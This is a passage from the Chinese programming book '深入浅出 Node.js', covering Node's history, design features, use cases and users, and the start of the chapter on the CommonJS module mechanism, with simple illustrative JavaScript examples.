> 深入浅出 Node.js  
> 出版时间：2013-12-01  
> 作者：朴灵

# 第 1 章 Node 简介

Node 应该是如今最火热的技术了，从本章开始，我们将逐步揭示它的诸多细节。

## 1.1 Node 的诞生历程

Node 的诞生历程如下所示。

- 2009 年 3 月，Ryan Dahl 在其博客上宣布准备基于 V8 创建一个轻量级的 Web 服务器并提供一套库。
- 2009 年 5 月，Ryan Dahl 在 GitHub 上发布了最初的版本。
- 2009 年 12 月和 2010 年 4 月，两届 JSConf 大会都安排了 Node 的讲座。
- 2010 年年底，Node 获得硅谷云计算服务商 Joyent 公司的资助，其创始人 Ryan Dahl 加入 Joyent 公司全职负责 Node 的发展。
- 2011 年 7 月，Node 在微软的支持下发布了其 Windows 版本。
- 2011 年 11 月，Node 超越 Ruby on Rails，成为 GitHub 上关注度最高的项目（随后被 Bootstrap 项目超越，目前仍居第二）。
- 2012 年 1 月底，Ryan Dahl 在对 Node 架构设计满意的情况下，将掌门人的身份转交给 Isaac Z. Schlueter，自己转向一些研究项目。Isaac Z. Schlueter 是 Node 的包管理器 NPM 的作者，之后 Node 的版本发布和 bug 修复等工作由他接手
- 截至笔者执笔之日（2013 年 7 月 13 日），发布的 Node 稳定版为 v0.10.13，非稳定版为 v0.11.4, NPM 的官方模块数达到 34943 个，模块的周下载量为 1479 万次。
- 随后，Node 的发布计划主要集中在性能提升上，在 v0.14 之后，正式发布出 v1.0 版本。

## 1.2 Node 的命名与起源

在 Node 的[官方网站](http://nodejs.org)之外，Node 具有很多别称：Nodejs、NodeJS、Node.js 等。本书在写作过程中遵循官方的说法，将会一直使用 Node 这个名字，但是在当前语境之外，为了与其余表示节点的技术或名词相区别，均可以带上`.js`表明它是 Node。在听到这些词汇时，应该意识到，它们说的是一码事。除了本书的封面和此处会用到 Node.js 外，其余地方都会以 Node 作为正式称谓。

Node 名字的来由，其实跟它的起源是有密切关系的。

### 1.2.1 为什么是 JavaScript

Ryan Dahl 是一名资深的 C/C++程序员，在创造出 Node 之前，他的主要工作都是围绕高性能 Web 服务器进行的。经历过一些尝试和失败之后，他找到了设计高性能，Web 服务器的几个要点：事件驱动、非阻塞 I/O。

所以 Ryan Dahl 最初的目标是写一个基于事件驱动、非阻塞 I/O 的 Web 服务器，以达到更高的性能，提供 Apache 等服务器之外的选择。他提到，大多数人不设计一种更简单和更有效率的程序的主要原因是他们用到了阻塞 I/O 的库。写作 Node 的时候，Ryan Dahl 曾经评估过 C、Lua、Haskell、Ruby 等语言作为备选实现，结论为：C 的开发门槛高，可以预见不会有太多的开发者能将它用于日常的业务开发，所以舍弃它；Ryan Dahl 觉得自己还不足够玩转 Haskell，所以舍弃它；Lua 自身已经含有很多阻塞 I/O 库，为其构建非阻塞 I/O 库也不能改变人们继续使用阻塞 I/O 库的习惯，所以也舍弃它；而 Ruby 的虚拟机由于性能不好而落选。

相比之下，JavaScript 比 C 的开发门槛要低，比 Lua 的历史包袱要少。尽管服务器端 JavaScript 存在已经很多年了，但是后端部分一直没有市场，可以说历史包袱为零，为其导入非阻塞 I/O 库没有额外阻力。另外，JavaScript 在浏览器中有广泛的事件驱动方面的应用，暗合 Ryan Dahl 喜好基于事件驱动的需求。当时，第二次浏览器大战也渐渐分出高下，Chrome 浏览器的 JavaScript 引擎 V8 摘得性能第一的桂冠，而且其基于新 BSD 许可证发布，自然受到 Ryan Dahl 的欢迎。考虑到高性能、符合事件驱动、没有历史包袱这 3 个主要原因，JavaScript 成为了 Node 的实现语言。

### 1.2.2 为什么叫 Node

起初，Ryan Dahl 称他的项目为 web.js，就是一个 Web 服务器，但是项目的发展超过了他最初单纯开发一个 Web 服务器的想法，变成了构建网络应用的一个基础框架，这样可以在它的基础上构建更多的东西，诸如服务器、客户端、命令行工具等。Node 发展为一个强制不共享任何资源的单线程、单进程系统，包含十分适宜网络的库，为构建大型分布式应用程序提供基础设施，其目标也是成为一个构建快速、可伸缩的网络应用平台。它自身非常简单，通过通信协议来组织许多 Node，非常容易通过扩展来达成构建大型网络应用的目的。每一个 Node 进程都构成这个网络应用中的一个节点，这是它名字所含意义的真谛。

## 1.3 Node 给 JavaScript 带来的意义

V8 给 Chrome 浏览器带来了一个强劲的心脏，使得它在浏览器大战中脱颖而出，也使得 Ryan Dahl 在语言评估中为选择 JavaScript 增加了一个极大的权重值。这里我们要谈谈 Node 给 JavaScript 带来的一个新局面。鉴于 Node 之前那些不给力的后端 JavaScript 实现，在性能和编程模型等方面没能达到与其他语言一较高下的程度，这里先撇开不谈，先谈谈 Node 与浏览器的对比。

Chrome 浏览器和 Node 的组件构成如图 1-1 所示。我们知道浏览器中除了 V8 作为 JavaScript 引擎外，还有一个 WebKit 布局引擎。HTML5 在发展过程中定义了更多更丰富的 API。在实现上，浏览器提供了越来越多的功能暴露给 JavaScript 和 HTML 标签。这个愿景美好，但对于前端浏览器的发展现状而言，HTML5 标准统一的过程是相对缓慢的。JavaScript 作为一门图灵完备的语言，长久以来却限制在浏览器的沙箱中运行，它的能力取决于浏览器中间层提供的支持有多少。

除了 HTML、WebKit 和显卡这些 UI 相关技术没有支持外，Node 的结构与 Chrome 十分相似。它们都是基于事件驱动的异步架构，浏览器通过事件驱动来服务界面上的交互，Node 通过事件驱动来服务 I/O，这个细节将在第 3 章中详述。在 Node 中，JavaScript 可以随心所欲地访问本地文件，可以搭建 WebSocket 服务器端，可以连接数据库，可以如 Web Workers 一样玩转多进程。如今，JavaScript 可以运行在不同的地方，不再继续限制在浏览器中与 CSS 样式表、DOM 树打交道。如果 HTTP 协议栈是水平面，Node 就是浏览器在协议栈另一边的倒影。Node 不处理 UI，但用与浏览器相同的机制和原理运行。Node 打破了过去 JavaScript 只能在浏览器中运行的局面。前后端编程环境统一，可以大大降低前后端转换所需要的上下文交换代价。

对于前端工程师而言，自己所熟悉的 JavaScript 如今竟然可以在另一个地方放出异彩，不谈其他原因，仅仅因为好奇，就值得去关注和探究它。

> 随着 Node 的出现，关于 JavaScript 的想象总是无限的。目前，社区已经出现 node-webkit 这样的项目，这个项目在 2012 年的沪 JS 会议上首次介绍给了公众。如同上文提及的关于浏览器的优势和限制，在 node-webkit 项目中，它将 Node 中的事件循环和 WebKit 的事件循环融合在一起，既可以通过它享受 HTML、CSS 带来的 UI 构建，也能通过它访问本地资源，将两者的优势整合到一起。桌面应用程序的开发可以完全通过 HTML、CSS、JavaScript 完成。

## 1.4 Node 的特点

作为后端 JavaScript 的运行平台，Node 保留了前端浏览器 JavaScript 中那些熟悉的接口，没有改写语言本身的任何特性，依旧基于作用域和原型链，区别在于它将前端中广泛运用的思想迁移到了服务器端。下面我们来看看 Node 相较其他语言的一些特点。

### 1.4.1 异步 I/O

关于异步 I/O，向前端工程师解释起来或许会容易一些，因为发起 Ajax 调用对于前端工程师而言是再熟悉不过的场景了。下面的代码用于发起一个 Ajax 请求：

```js
$.post("/url", { title: "深入浅出 Node.js" }, function (data) {
  console.log("收到响应");
});
console.log("发送Ajax结束");
```

熟悉异步的用户必然知道，“收到响应”是在“发送 Ajax 结束”之后输出的。在调用`$.post()`后，后续代码是被立即执行的，而“收到响应”的执行时间是不被预期的。我们只知道它将在这个异步请求结束后执行，但并不知道具体的时间点。异步调用中对于结果值的捕获是符合“Don't call me, I willcall you”的原则的，这也是注重结果，不关心过程的一种表现。图 1-2 是一个经典的 Ajax 调用。

在 Node 中，异步 I/O 也很常见。以读取文件为例，我们可以看到它与前端 Ajax 调用的方式是极其类似的：

```js
var fs = require("fs");
fs.readFile("/path", function (err, file) {
  console.log("读取文件完成");
});
console.log("发起读取文件");
```

在 Node 中，绝大多数的操作都以异步的方式进行调用。Ryan Dahl 排除万难，在底层构建了很多异步 I/O 的 API，从文件读取到网络请求等，均是如此。这样的意义在于，在 Node 中，我们可以从语言层面很自然地进行并行 I/O 操作。每个调用之间无须等待之前的 I/O 调用结束。在编程模型上可以极大提升效率。

下面的两个文件读取任务的耗时取决于最慢的那个文件读取的耗时：

```js
fs.readFile("/path1", function (err, file) {
  console.log("读取文件1完成");
});
fs.readFile("/path2", function (err, file) {
  console.log("读取文件2完成");
});
```

而对于同步 I/O 而言，它们的耗时是两个任务的耗时之和。这里异步带来的优势是显而易见的。

关于异步 I/O 是如何提升效率的及其本身的机制和实现，我们将在第 3 章中详述。

### 1.4.2 事件与回调函数

随着 Web 2.0 时代的到来，JavaScript 在前端担任了更多的职责，事件也得到了广泛的应用。Node 不像 Rhino 那样受 Java 的影响很大，而是将前端浏览器中应用广泛且成熟的事件引入后端，配合异步 I/O，将事件点暴露给业务逻辑。

下面的例子展示的是 Ajax 异步提交的服务器端处理过程。Node 创建一个 Web 服务器，并侦听 8080 端口。对于服务器，我们为其绑定了 request 事件，对于请求对象，我们为其绑定了 data 事件和 end 事件：

```js
var http = require("http");
var querystring = require("querystring");
// 侦听服务器的request事件
http
  .createServer(function (req, res) {
    var postData = "";
    req.setEncoding("utf8");
    // 侦听请求的data事件
    req.on("data", function (trunk) {
      postData += trunk;
    });
    // 侦听请求的end事件
    req.on("end", function () {
      res.end(postData);
    });
  })
  .listen(8080);
console.log("服务器启动成 ");
```

相应地，我们在前端为 Ajax 请求绑定了 success 事件，在发出请求后，只需关心请求成功时执行相应的业务逻辑即可，相关代码如下：

```js
$.ajax({
  url: "/url",
  method: "POST",
  data: {},
  success: function (data) {
    // success事件
  },
});
```

相比之下，无论在前端还是后端，事件都是常用的。对于其他语言来说，这种俯拾皆是 JavaScript 的熟悉感觉是基本不会出现的。

事件的编程方式具有轻量级、松耦合、只关注事务点等优势，但是在多个异步任务的场景下，事件与事件之间各自独立，如何协作是一个问题。

从前面可以看到，回调函数无处不在。这是因为在 JavaScript 中，我们将函数作为第一等公民来对待，可以将函数作为对象传递给方法作为实参进行调用。

与其他的 Web 后端编程语言相比，Node 除了异步和事件外，回调函数是一大特色。纵观下来，回调函数也是最好的接受异步调用返回数据的方式。但是这种编程方式对于很多习惯同步思路编程的人来说，也许是十分不习惯的。代码的编写顺序与执行顺序并无关系，这对他们可能造成阅读上的障碍。在流程控制方面，因为穿插了异步方法和回调函数，与常规的同步方式相比，变得不那么一目了然了。

在转变为异步编程思维后，通过对业务的划分和对事件的提炼，在流程控制方面处理业务的复杂度与同步方式实际上是一致的。

关于流程控制和事件协作的方法和技巧，我们将在第 4 章中进一步探讨。

### 1.4.3 单线程

Node 保持了 JavaScript 在浏览器中单线程的特点。而且在 Node 中，JavaScript 与其余线程是无法共享任何状态的。单线程的最大好处是不用像多线程编程那样处处在意状态的同步问题，这里没有死锁的存在，也没有线程上下文交换所带来的性能上的开销。

同样，单线程也有它自身的弱点，这些弱点是学习 Node 的过程中必须要面对的。积极面对这些弱点，可以享受到 Node 带来的好处，也能避免潜在的问题，使其得以高效利用。单线程的弱点具体有以下 3 方面。

- 无法利用多核 CPU。
- 错误会引起整个应用退出，应用的健壮性值得考验。
- 大量计算占用 CPU 导致无法继续调用异步 I/O。

像浏览器中 JavaScript 与 UI 共用一个线程一样，JavaScript 长时间执行会导致 UI 的渲染和响应被中断。在 Node 中，长时间的 CPU 占用也会导致后续的异步 I/O 发不出调用，已完成的异步 I/O 的回调函数也会得不到及时执行。

最早解决这种大计算量问题的方案是 Google 公司开发的 Gears。它启用一个完全独立的进程，将需要计算的程序发送给这个进程，在结果得出后，通过事件将结果传递回来。这个模型将计算量分发到其他进程上，以此来降低运算造成阻塞的几率。后来，HTML5 定制了 Web Workers 的标准，Google 放弃了 Gears，全力支持 Web Workers。Web Workers 能够创建工作线程来进行计算，以解决 JavaScript 大计算阻塞 UI 渲染的问题。工作线程为了不阻塞主线程，通过消息传递的方式来传递运行结果，这也使得工作线程不能访问到主线程中的 UI。

Node 采用了与 Web Workers 相同的思路来解决单线程中大计算量的问题：child_process。

子进程的出现，意味着 Node 可以从容地应对单线程在健壮性和无法利用多核 CPU 方面的问题。通过将计算分发到各个子进程，可以将大量计算分解掉，然后再通过进程之间的事件消息来传递结果，这可以很好地保持应用模型的简单和低依赖。通过 Master-Worker 的管理方式，也可以很好地管理各个工作进程，以达到更高的健壮性。

关于如何通过子进程来充分利用硬件资源和提升应用的健壮性，这是一个值得探究的话题。怎样才能使我们既享受到无忧无虑的单线程编程，又高效利用资源呢？请挪步到第 9 章。

### 1.4.4 跨平台

起初，Node 只可以在 Linux 平台上运行。如果想在 Windows 平台上学习和使用 Node，则必须通过 Cygwin 或者 MinGW。随着 Node 的发展，微软注意到了它的存在，并投入了一个团队帮助 Node 实现 Windows 平台的兼容，在 v0.6.0 版本发布时，Node 已经能够直接在 Windows 平台上运行了。图 1-4 是 Node 基于 libuv 实现跨平台的架构示意图。

兼容 Windows 和 Linux 平台主要得益于 Node 在架构层面的改动，它在操作系统与 Node 上层模块系统之间构建了一层平台层架构，即 libuv。目前，libuv 已经成为许多系统实现跨平台的基础组件。关于 libuv 的设计，我们将在第 3 章中介绍。

通过良好的架构，Node 的第三方 C++模块也可以借助 libuv 实现跨平台。目前，除了没有保持更新的 C++模块外，大部分 C++模块都能实现跨平台的兼容。

## 1.5 Node 的应用场景

在进行技术选型之前，需要了解一项新技术具体适合什么样的场景，毕竟合适的技术用在合适的场景可以起到意想不到的效果。关于 Node，探讨得较多的主要有 I/O 密集型和 CPU 密集型。

1.5.1 I/O 密集型

在 Node 的推广过程中，无数次有人问起 Node 的应用场景是什么。如果将所有的脚本语言拿到一处来评判，那么从单线程的角度来说，Node 处理 I/O 的能力是值得竖起拇指称赞的。通常，说 Node 擅长 I/O 密集型的应用场景基本上是没人反对的。Node 面向网络且擅长并行 I/O，能够有效地组织起更多的硬件资源，从而提供更多好的服务。

I/O 密集的优势主要在于 Node 利用事件循环的处理能力，而不是启动每一个线程为每一个请求服务，资源占用极少。

1.5.2 是否不擅长 CPU 密集型业务
换一个角度，在 CPU 密集的应用场景中，Node 是否能胜任呢？实际上，V8 的执行效率是十分高的。单以执行效率来做评判，V8 的执行效率是毋庸置疑的。

我们将相同的斐波那契数列计算（F0=0, F1=1, Fn=F(n-1)+F(n-2)(n≥2)）分别用各种脚本语言写了算法实现，并进行了 n = 40 的计算，以比较性能。这个测试主要偏重 CPU 栈操作，表 1-1 是其中一次运算耗时的排行。在这些脚本语言中（其中 C 和 Go 语言是静态语言，用于参考）, Node 是足够高效的，它优秀的运算能力主要来自 V8 的深度性能优化。

这样的测试结果尽管不能完全反映出各个语言的性能优劣，但已经可以表明 Node 在性能上不俗的表现。从另一个角度来说，这可以表明 CPU 密集型应用其实并不可怕。CPU 密集型应用给 Node 带来的挑战主要是：由于 JavaScript 单线程的原因，如果有长时间运行的计算（比如大循环），将会导致 CPU 时间片不能释放，使得后续 I/O 无法发起。但是适当调整和分解大型运算任务为多个小任务，使得运算能够适时释放，不阻塞 I/O 调用的发起，这样既可同时享受到并行异步 I/O 的好处，又能充分利用 CPU。

关于 CPU 密集型应用，Node 的异步 I/O 已经解决了在单线程上 CPU 与 I/O 之间阻塞无法重叠利用的问题，I/O 阻塞造成的性能浪费远比 CPU 的影响小。对于长时间运行的计算，如果它的耗时超过普通阻塞 I/O 的耗时，那么应用场景就需要重新评估，因为这类计算比阻塞 I/O 还影响效率，甚至说就是一个纯计算的场景，根本没有 I/O。此类应用场景或许应当采用多线程的方式进行计算。Node 虽然没有提供多线程用于计算支持，但是还是有以下两个方式来充分利用 CPU。

- Node 可以通过编写 C/C++扩展的方式更高效地利用 CPU，将一些 V8 不能做到性能极致的地方通过 C/C++来实现。由上面的测试结果可以看到，通过 C/C++扩展的方式实现斐波那契数列计算，速度比 Java 还快。
- 如果单线程的 Node 不能满足需求，甚至用了 C/C++扩展后还觉得不够，那么通过子进程的方式，将一部分 Node 进程当做常驻服务进程用于计算，然后利用进程间的消息来传递结果，将计算与 I/O 分离，这样还能充分利用多 CPU。

CPU 密集不可怕，如何合理调度是诀窍。

1.5.3 与遗留系统和平共处
有人会说：“JavaScript 一统前后端了，将来会不会干掉其他的语言？”言语中充满了危机感。

在 Web 端，过去大多都是同步的方式编写的程序，这种串行调用下层应用数据的过程中充斥着串行的等待时间，如果采用多线程来解决这种串行等待，又或多或少地显得小题大作。在 Node 中，语言层面即可天然并行的特性在这种场景中显得十分有效。对于已有的稳定系统，并非意味着我们要抛弃掉。

LinkedIn 在他们的移动版网站上的实践非常典型地说明了这个问题。旧有的系统具有非常稳定的数据输出，持续为传统网站服务，同时为移动版提供数据源，Node 将该数据源当做数据接口，发挥异步并行的优势，而不用关心它背后是用什么语言实现的。

这方面，国内的雪球财经也有很好的实践。雪球财经是从旧有的 Java 项目中分离出一个子项目，在这个子项目中，没有继续采用 Java/JSP 而是采用 Node 来完成 Web 端的开发，使得前端工程师在 HTTP 协议栈的两端能够高效灵活地开发，避免了 Java 烦琐的表达；另一方面，又利用 Java 作为后端接口和中间件，使其具有良好的稳定性。两者互相结合，取长补短。

1.5.4 分布式应用
阿里巴巴的数据平台对 Node 的分布式应用算是一个典型的例子。分布式应用意味着对可伸缩性的要求非常高。数据平台通常要在一个数据库集群中去寻找需要的数据。阿里巴巴开发了中间层应用 NodeFox、ITier，将数据库集群做了划分和映射，查询调用依旧是针对单张表进行 SQL 查询，中间层分解查询 SQL，并行地去多台数据库中获取数据并合并。NodeFox 能实现对多台 MySQL 数据库的查询，如同查询一台 MySQL 一样，而 ITier 更强大，查询多个数据库如同查询单个数据库一样，这里的多个数据库是指不同的数据库，如 MySQL 或其他的数据库。

这个案例其实也是高效利用并行 I/O 的例子。Node 高效利用并行 I/O 的过程，也是高效使用数据库的过程。对于 Node，这个行为只是一次普通的 I/O。对于数据库而言，却是一次复杂的计算，所以也是进而充分压榨硬件资源的过程。

## 1.6 Node 的使用者

在短短四年多的时间里，Node 变得非常热门，使用者也非常多。这些使用者对于 Node 的各自倚重点也各不相同。经过整理，主要有下面几类。

- 前后端编程语言环境统一。这类倚重点的代表是雅虎。雅虎开放了 Cocktail 框架，利用自己深厚的前端沉淀，将 YUI3 这个前端框架的能力借助 Node 延伸到服务器端，使得使用者摆脱了日常工作中一边写 JavaScript 一边写 PHP 所带来的上下文交换负担。
- Node 带来的高性能 I/O 用于实时应用。Voxer 将 Node 应用在实时语音上。国内腾讯网的朋友将 Node 应用在长连接中，以提供实时功能，花瓣网、蘑菇街等公司通过 socket.io 实现实时通知的功能。
- 并行 I/O 使得使用者可以更高效地利用分布式环境。阿里巴巴和 eBay 是这方面的典型。阿里巴巴的 NodeFox 和 eBay 的 ql.io 都是借用 Node 并行 I/O 的能力，更高效地使用已有的数据。
- 并行 I/O，有效利用稳定接口提升 Web 渲染能力。雪球财经和 LinkedIn 的移动版网站均是这种案例，撇弃同步等待式的顺序请求，大胆采用并行 I/O，加速数据的获取进而提升 Web 的渲染速度。
- 云计算平台提供 Node 支持。微软将 Node 引入 Azure 的开发中，阿里云、百度均纷纷在云服务器上提供 Node 应用托管服务，Joyent 更是云计算中提供 Node 支持的代表。这类平台看重 JavaScript 带来的开发上的优势，以及低资源占用、高性能的特点。
- 游戏开发领域。游戏领域对实时和并发有很高的要求，网易开源了 pomelo 实时框架，可以应用在游戏和高实时应用中。
- 工具类应用。过去依赖 Java 或其他语言构建的前端工具类应用，纷纷被一些前端工程师用 Node 重写，用前端熟悉的语言为前端构建熟悉的工具。

## 1.7 参考资源

本章参考的资源如下：

- http://www.infoq.com/cn/articles/what-is-nodejs
- https://github.com/popular/watched
- http://groups.google.com/group/nodejs/browse_thread/thread/85f6a3829bc64cb6
- http://groups.google.com/groups/profile?enc_user=dPo6jggAAACthftLMWCfUq8U6obMz179
- http://search.npmjs.org/
- http://code.google.com/p/v8/
- http://cnodejs.org/topic/4f16442ccae1f4aa27001137
- http://weibo.com/1744667943/eBszJXcEsX1
- http://stackoverflow.com/questions/5621812/why-is-node-js-named-node-js
- http://www.theregister.co.uk/2011/03/01/the_rise_and_rise_of_node_dot_js/page4.html
- http://ued.taobao.com/blog/2011/09/02/what-is-nod/
- http://www.infoq.com/cn/news/2012/04/interview-xueqiu-using-nodejs
- http://teddziuba.com/2011/10/node-js-is-cancer.html
- http://www.cnblogs.com/fengmk2/archive/2011/12/14/2288147.html

# 第 2 章 模块机制

首先，我想从模块为你娓娓道来 Node。

JavaScript 自诞生以来，曾经没有人拿它当做一门真正的编程语言，认为它不过是一种网页小脚本而已，在 Web 1.0 时代，这种脚本语言在网络中主要有两个作用广为流传，一个是表单校验，另一个是网页特效。另一方面，由于仓促地被创造出来，所以它自身的各种陷阱和缺点也被各种编程人员广为诟病。直到 Web 2.0 时代，前端工程师利用它大大提升了网页上的用户体验。在这个过程中，B/S 应用展现出比 C/S 应用优越的地方。至此，JavaScript 才被广泛重视起来。

在 Web 2.0 流行的过程中，各种前端库和框架被开发出来，它们最初用于兼容各个版本的浏览器，随后随着更多的用户需求在前端被实现，JavaScript 也从表单校验跃迁到应用开发的级别上。在这个过程中，它大致经历了工具类库、组件库、前端框架、前端应用的变迁，如图 2-1 所示。

经历了长长的后天努力过程，JavaScript 不断被类聚和抽象，以更好地组织业务逻辑。从另一个角度而言，它也道出了 JavaScript 先天就缺乏的一项功能：模块。

在其他高级语言中，Java 有类文件，Python 有 import 机制，Ruby 有 require, PHP 有 include 和 require。而 JavaScript 通过`<script>`标签引入代码的方式显得杂乱无章，语言自身毫无组织和约束能力。人们不得不用命名空间等方式人为地约束代码，以求达到安全和易用的目的。

但是看起来凌乱的 JavaScript 编程现状并不代表着社区没有进步，JavaScript 的本地化编程之路一直在探索中。在 Node 出现之前，服务器端 JavaScript 基本没有市场，与欣欣向荣的前端 JavaScript 应用相比，Rhino 等后端 JavaScript 运行环境基本只是用于小工具，但是经历十多年的发展后，社区也为 JavaScript 制定了相应的规范，其中 CommonJS 规范的提出算是最为重要的里程碑。

## 2.1 CommonJS 规范

CommonJS 规范为 JavaScript 制定了一个美好的愿景——希望 JavaScript 能够在任何地方运行。

2.1.1 CommonJS 的出发点
在 JavaScript 的发展历程中，它主要在浏览器前端发光发热。由于官方规范（ECMAScript）规范化的时间较早，规范涵盖的范畴非常小。这些规范中包含词法、类型、上下文、表达式、声明（statement）、方法、对象等语言的基本要素。在实际应用中，JavaScript 的表现能力取决于宿主环境中的 API 支持程度。在 Web 1.0 时代，只有对 DOM、BOM 等基本的支持。随着 Web 2.0 的推进，HTML5 崭露头角，它将 Web 网页带进 Web 应用的时代，在浏览器中出现了更多、更强大的 API 供 JavaScript 调用，这得感谢 W3C 组织对 HTML5 规范的推进以及各大浏览器厂商对规范的大力支持。但是，Web 在发展，浏览器中出现了更多的标准 API，这些过程发生在前端，后端 JavaScript 的规范却远远落后。对于 JavaScript 自身而言，它的规范依然是薄弱的，还有以下缺陷。

- 没有模块系统。
- 标准库较少。ECMAScript 仅定义了部分核心库，对于文件系统，I/O 流等常见需求却没有标准的 API。就 HTML5 的发展状况而言，W3C 标准化在一定意义上是在推进这个过程，但是它仅限于浏览器端。
- 没有标准接口。在 JavaScript 中，几乎没有定义过如 Web 服务器或者数据库之类的标准统一接口。
- 缺乏包管理系统。这导致 JavaScript 应用中基本没有自动加载和安装依赖的能力。

CommonJS 规范的提出，主要是为了弥补当前 JavaScript 没有标准的缺陷，以达到像 Python、Ruby 和 Java 具备开发大型应用的基础能力，而不是停留在小脚本程序的阶段。他们期望那些用 CommonJS API 写出的应用可以具备跨宿主环境执行的能力，这样不仅可以利用 JavaScript 开发富客户端应用，而且还可以编写以下应用。

- 服务器端 JavaScript 应用程序。
- 命令行工具。
- 桌面图形界面应用程序。
- 混合应用（Titanium 和 Adobe AIR 等形式的应用）。

如今，CommonJS 中的大部分规范虽然依旧是草案，但是已经初显成效，为 JavaScript 开发大型应用程序指明了一条非常棒的道路。目前，它依旧在成长中，这些规范涵盖了模块、二进制、Buffer、字符集编码、I/O 流、进程环境、文件系统、套接字、单元测试、Web 服务器网关接口、包管理等。

理论和实践总是相互影响和促进的，Node 能以一种比较成熟的姿态出现，离不开 CommonJS 规范的影响。在服务器端，CommonJS 能以一种寻常的姿态写进各个公司的项目代码中，离不开 Node 优异的表现。实现的优良表现离不开规范最初优秀的设计，规范因实现的推广而得以普及。图 2-2 是 Node 与浏览器以及 W3C 组织、CommonJS 组织、ECMAScript 之间的关系，共同构成了一个繁荣的生态系统。

图 2-2 Node 与浏览器以及 W3C 组织、CommonJS 组织、ECMAScript 之间的关系

Node 借鉴 CommonJS 的 Modules 规范实现了一套非常易用的模块系统，NPM 对 Packages 规范的完好支持使得 Node 应用在开发过程中事半功倍。在本章中，我们主要就 Node 的模块和包的实现进行展开说明。

2.1.2 CommonJS 的模块规范

CommonJS 对模块的定义十分简单，主要分为模块引用、模块定义和模块标识 3 个部分。

1. 模块引用

模块引用的示例代码如下：

```js
var math = require("math");
```

在 CommonJS 规范中，存在 require()方法，这个方法接受模块标识，以此引入一个模块的 API 到当前上下文中。

2. 模块定义在模块中，上下文提供 require()方法来引入外部模块。对应引入的功能，上下文提供了 exports 对象用于导出当前模块的方法或者变量，并且它是唯一导出的出口。在模块中，还存在一个 module 对象，它代表模块自身，而 exports 是 module 的属性。在 Node 中，一个文件就是一个模块，将方法挂载在 exports 对象上作为属性即可定义导出的方式：

```js
// math.js
exports.add = function () {
  var sum = 0,
    i = 0,
    args = arguments,
    l = args.length;
  while (i < l) {
    sum += args[i++];
  }
  return sum;
};
```

在另一个文件中，我们通过 require()方法引入模块后，就能调用定义的属性或方法了：

```js
// program.js
var math = require("math");
exports.increment = function (val) {
  return math.add(val, 1);
};
```

3. 模块标识模块标识其实就是传递给 require()方法的参数，它必须是符合小驼峰命名的字符串，或者以`.`、`..`开头的相对路径，或者绝对路径。它可以没有文件名后缀`.js`。

模块的定义十分简单，接口也十分简洁。它的意义在于将类聚的方法和变量等限定在私有的作用域中，同时支持引入和导出功能以顺畅地连接上下游依赖。如图 2-3 所示，每个模块具有独立的空间，它们互不干扰，在引用时也显得干净利落。

图 2-3 模块定义

CommonJS 构建的这套模块导出和引入机制使得用户完全不必考虑变量污染，命名空间等方案与之相比相形见绌。

2.2 Node 的模块实现

Node 在实现中并非完全按照规范实现，而是对模块规范进行了一定的取舍，同时也增加了少许自身需要的特性。尽管规范中 exports、require 和 module 听起来十分简单，但是 Node 在实现它们的过程中究竟经历了什么，这个过程需要知晓。

在 Node 中引入模块，需要经历如下 3 个步骤。

1. 路径分析
2. 文件定位
3. 编译执行

在 Node 中，模块分为两类：一类是 Node 提供的模块，称为核心模块；另一类是用户编写的模块，称为文件模块。

- 核心模块部分在 Node 源代码的编译过程中，编译进了二进制执行文件。在 Node 进程启动时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和编译执行这两个步骤可以省略掉，并且在路径分析中优先判断，所以它的加载速度是最快的。
- 文件模块则是在运行时动态加载，需要完整的路径分析、文件定位、编译执行过程，速度比核心模块慢。

接下来，我们展开详细的模块加载过程。

2.2.1 优先从缓存加载
展开介绍路径分析和文件定位之前，我们需要知晓的一点是，与前端浏览器会缓存静态脚本文件以提高性能一样，Node 对引入过的模块都会进行缓存，以减少二次引入时的开销。不同的地方在于，浏览器仅仅缓存文件，而 Node 缓存的是编译和执行之后的对象。

不论是核心模块还是文件模块，require()方法对相同模块的二次加载都一律采用缓存优先的方式，这是第一优先级的。不同之处在于核心模块的缓存检查先于文件模块的缓存检查。

2.2.2 路径分析和文件定位
因为标识符有几种形式，对于不同的标识符，模块的查找和定位有不同程度上的差异。

1. 模块标识符分析

前面提到过，require()方法接受一个标识符作为参数。在 Node 实现中，正是基于这样一个标识符进行模块查找的。模块标识符在 Node 中主要分为以下几类。

- 核心模块，如 http、fs、path 等。
- .或.开始的相对路径文件模块。
- 以/开始的绝对路径文件模块。
- 非路径形式的文件模块，如自定义的 connect 模块。

**核心模块**
核心模块的优先级仅次于缓存加载，它在 Node 的源代码编译过程中已经编译为二进制代码，其加载过程最快。

如果试图加载一个与核心模块标识符相同的自定义模块，那是不会成功的。如果自己编写了一个 http 用户模块，想要加载成功，必须选择一个不同的标识符或者换用路径的方式。

**路径形式的文件模块**

以`.`、`..`和`/`开始的标识符，这里都被当做文件模块来处理。在分析文件模块时，require()方法会将路径转为真实路径，并以真实路径作为索引，将编译执行后的结果存放到缓存中，以使二次加载时更快。

由于文件模块给 Node 指明了确切的文件位置，所以在查找过程中可以节约大量时间，其加载速度慢于核心模块。
**自定义模块**

自定义模块指的是非核心模块，也不是路径形式的标识符。它是一种特殊的文件模块，可能是一个文件或者包的形式。这类模块的查找是最费时的，也是所有方式中最慢的一种。

在介绍自定义模块的查找方式之前，需要先介绍一下模块路径这个概念。

模块路径是 Node 在定位文件模块的具体文件时制定的查找策略，具体表现为一个路径组成的数组。关于这个路径的生成规则，我们可以手动尝试一番。

1. 创建 module_path.js 文件，其内容为 console.log(module.paths);。
2. 将其放到任意一个目录中然后执行 nodemodule_path.js。

在 Linux 下，你可能得到的是这样一个数组输出：

```js
[
  "/home/jackson/research/node_modules",
  "/home/jackson/node_modules",
  "/home/node_modules",
  "/node_modules",
];
```

而在 Windows 下，也许是这样：

```js
["c:\\nodejs\\node_modules", "c:\\node_modules"];
```

可以看出，模块路径的生成规则如下所示。

- 当前文件目录下的 node_modules 目录。
- 父目录下的 node_modules 目录。
- 父目录的父目录下的 node_modules 目录。
- 沿路径向上逐级递归，直到根目录下的 node_modules 目录。

它的生成方式与 JavaScript 的原型链或作用域链的查找方式十分类似。在加载的过程中，Node 会逐个尝试模块路径中的路径，直到找到目标文件为止。可以看出，当前文件的路径越深，模块查找耗时会越多，这是自定义模块的加载速度是最慢的原因。

2. 文件定位

从缓存加载的优化策略使得二次引入时不需要路径分析、文件定位和编译执行的过程，大大提高了再次加载模块时的效率。

但在文件的定位过程中，还有一些细节需要注意，这主要包括文件扩展名的分析、目录和包的处理。

**文件扩展名分析**
